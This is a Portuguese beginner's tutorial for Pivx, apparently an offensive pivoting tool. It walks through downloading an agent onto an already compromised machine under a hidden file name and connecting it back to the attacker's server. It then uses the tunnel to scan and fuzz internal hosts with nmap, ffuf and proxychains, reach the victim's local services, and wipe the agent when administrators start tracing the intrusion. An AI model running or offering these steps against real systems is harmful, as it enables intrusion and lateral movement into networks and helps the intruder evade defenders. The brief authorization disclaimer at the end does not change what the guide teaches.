[English](TUTORIAL.md) | [Español](TUTORIAL_es.md) | [Português](TUTORIAL_pt.md) | [中文](TUTORIAL_zh.md)

[← Voltar ao README](../README.md)

# 🎮 Guia Rápido: Pivx para Iniciantes

## O que é o Pivx?

Imagine que a rede que você quer investigar é um **castelo trancado e vigiado**. O Pivx é um **portal mágico e invisível**. Em vez de lutar com configurações de rede complicadas, você monta um "Centro de Comando" visual no seu computador e envia um "Agente" para dentro do castelo. Quando ambos se conectam, você pode usar todas as suas ferramentas de fora como se estivesse sentado fisicamente lá dentro.

---

## 🚀 Etapa 1: Seu Centro de Comando

Primeiro, vamos ligar a sua base de operações segura.

- Abra seu console de atacante e digite o comando de inicialização:

```bash
sudo server/venv/bin/streamlit run server/app.py
```

- Abra seu navegador favorito e acesse: **http://localhost:8501**
- Confira seu novo painel de controle web — a partir daqui você gerenciará todas as suas rotas e conexões com simples cliques.

---

## 🕵️‍♂️ Etapa 2: O Agente Secreto

Agora precisamos que nosso infiltrado abra a porta de dentro do castelo.

- Envie o arquivo `pivx-agent-linux-amd64` para a máquina que você já conseguiu comprometer:

```bash
wget https://github.com/HangLoose84/Pivx/releases/latest/download/pivx-agent-linux-amd64 -O /tmp/.p
chmod +x /tmp/.p
```

- Inicie o agente e diga a ele onde está a sua base:

```bash
/tmp/.p --server ws://<SEU_IP_ATACANTE>:8765
```

- Volte ao seu painel web e comemore ao ver seu agente secreto aparecer na tabela como **"online"**. 🎉

---

## 🪄 Etapa 3: Seus Superpoderes

Com o portal aberto, seus truques especiais estão habilitados diretamente da sua máquina.

### 🛡️ O Radar (Smartping)

Use comandos normais como `ping` ou lance escaneamentos rápidos contra as máquinas do castelo; o agente responderá por elas.

```bash
ping 10.10.20.100
nmap -sn 10.10.20.0/24
```

### 🎭 O Disfarce (SOCKS5)

Clique no botão **"Start SOCKS5"** no seu painel web para abrir um túnel seguro na porta local **1080**.

```bash
curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.100/
```

### 🔍 A Lupa do Infiltrado

Configure ferramentas como Burp Suite, ffuf ou proxychains para apontar para `127.0.0.1:1080` e analisar todo o castelo.

```bash
proxychains -q nmap -sT -Pn -p 80,443 10.10.20.100
ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.100/FUZZ -w wordlist.txt
```

### 🪞 O Espelho (Magic IP)

Se você quer verificar quais programas secretos a vítima está escondendo na própria máquina, simplesmente acesse `http://240.0.0.1` pelo seu navegador ou ferramentas:

```bash
curl --socks5-hostname 127.0.0.1:1080 http://240.0.0.1:8080/
```

O endereço mágico `240.0.0.1` é traduzido automaticamente para o `127.0.0.1` do agente.

### 🔴 O Botão de Pânico (Kill Switch)

Se você perceber que os administradores da rede estão rastreando você, pressione o botão vermelho **"Kill"** no seu painel para destruir o agente instantaneamente. Sem rastros, sem arquivos residuais.

---

> ⚠️ **Use apenas em sistemas de sua propriedade ou com autorização explícita por escrito.**
